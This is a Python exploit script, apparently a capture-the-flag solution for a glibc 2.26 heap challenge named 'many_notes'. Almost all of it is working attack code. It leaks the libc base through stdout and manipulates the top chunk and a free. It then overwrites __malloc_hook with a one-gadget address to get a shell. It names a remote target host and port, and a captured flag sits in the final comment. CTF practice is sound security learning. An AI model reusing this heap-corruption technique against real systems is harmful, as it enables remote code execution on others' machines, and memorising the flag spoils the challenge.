# File: exp.py
# Author: raycp
# Date: 2019-05-20
# Description: exp for many_note

from pwn_debug.pwn_debug import *
from pwn_debug.IO_FILE_plus import *
pdbg=pwn_debug("many_notes")

#pdbg.context.log_level="debug"
pdbg.context.terminal=['tmux', 'splitw', '-h']

pdbg.local("./libc.so.6","/glibc/x64/2.26/lib/ld-2.26.so")
pdbg.debug("2.26")
pdbg.remote('123.206.174.203', 20003,"./libc.so.6")
p=pdbg.run("local")
#p=pdbg.run("remote")
#p=pdbg.run("debug")
#membp=pdbg.membp
#print type(pdbg.membp)
#print pdbg.hh
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc
#a=IO_FILE_plus()
#print a
#a.show()
#print a._IO_read_base
def malloc(size,pad,data):
    p.recvuntil("oice: ")
    p.sendline("0")
    p.recvuntil("ize: ")
    p.sendline(str(size))
    p.recvuntil("ding: ")
    p.sendline(str(pad))
    p.recvuntil("(0/1): ")
    p.sendline("1")
    p.recvuntil("tent: ")
    p.send(data)
    raw_input("pause >")
def malloc_no_data(size,pad):
    p.recvuntil("oice: ")
    p.sendline("0")
    p.recvuntil("ize: ")
    p.sendline(str(size))
    p.recvuntil("ding: ")
    p.sendline(str(pad))
    p.recvuntil("(0/1): ")
    p.sendline("0")

def pwn():
    #pdbg.bp(0xc67)
    p.recvuntil("name: ")
    p.send("a"*8)
    p.recvuntil("a"*8)
    ## step 1 leak libc address
    libc_base=u64(p.recvuntil('\x7f').ljust(8,'\x00'))-libc.symbols['_IO_2_1_stdout_']
    malloc_hook=libc_base+libc.symbols['__malloc_hook']
    rce=libc_base+0xdea81 
    log.info("leak libc base: %s"%(hex(libc_base)))
    malloc_no_data(0xff0,0x1f)

    ## step 2 expand the top chunk
    malloc_no_data(0xff0,0)
    #malloc_no_data(0xff0,0)
    for i in range(0,15):
        malloc_no_data(0xff0,0x400)
    malloc_no_data(0xff0,0x3d0-3)
    #pdbg.bp([0xb4f,0xc67,0xcea])

    ## step 3 trigger free function.
    malloc_no_data(0x200,0)
    #pdbg.bp([0xb4f,0xc67,0xcea])
    data=(p64(0)+p64(0))*0xfe
    malloc(0xff0,1,data)
    data=p64(0)*2+p64(0)+p64(0x2d5)+p64(malloc_hook)
    p.send(data)
    #pdbg.bp([0xb4f,0xc67,0xcea])
    malloc_no_data(0x2c0,0)
    #pdbg.bp([0xb4f,0xc67,0xcea])
    ## step 4 malloc out malloc_hook and get shell
    malloc(0x2c0,0,p64(rce).ljust(0x2c0))
    p.interactive() #get the shell

if __name__ == '__main__':
   pwn()

#*CTF{LtMh5VbedHlngmKOS2cwWRo4AkDGzCBy}

